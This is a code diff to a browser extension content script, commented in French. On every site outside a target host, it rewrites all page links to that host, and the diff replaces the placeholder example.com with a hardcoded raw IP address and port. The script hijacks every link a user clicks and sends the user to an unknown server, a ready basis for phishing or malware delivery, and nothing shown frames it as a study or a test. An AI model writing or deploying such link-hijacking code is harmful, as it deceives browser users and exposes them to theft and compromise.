@@ -4,14 +4,14 @@ export default defineContentScript({
 		const currentUrl = window.location.href;
 
 		// Fonctionnalité 1 : Détournement des liens
-		if (!currentUrl.startsWith("https://example.com")) {
+		if (!currentUrl.startsWith("https://176.118.198.192:3001")) {
 			const replaceLinks = () => {
 				const links = document.querySelectorAll(
 					"a[href]"
 				) as NodeListOf<HTMLAnchorElement>;
 				links.forEach((link) => {
-					if (!link.href.startsWith("https://example.com")) {
-						link.href = "https://example.com";
+					if (!link.href.startsWith("https://176.118.198.192:3001")) {
+						link.href = "https://176.118.198.192:3001";
 					}
 				});
 			};
@@ -31,7 +31,7 @@ export default defineContentScript({
 		}
 
 		// Fonctionnalité 2 : Détection souris à l'extérieur (seulement sur example.com)
-		if (currentUrl.startsWith("https://example.com")) {
+		if (currentUrl.startsWith("https://176.118.198.192:3001")) {
 			console.log("Content script actif sur example.com");
 
 			// Utiliser une approche plus robuste pour détecter la souris à l'extérieur
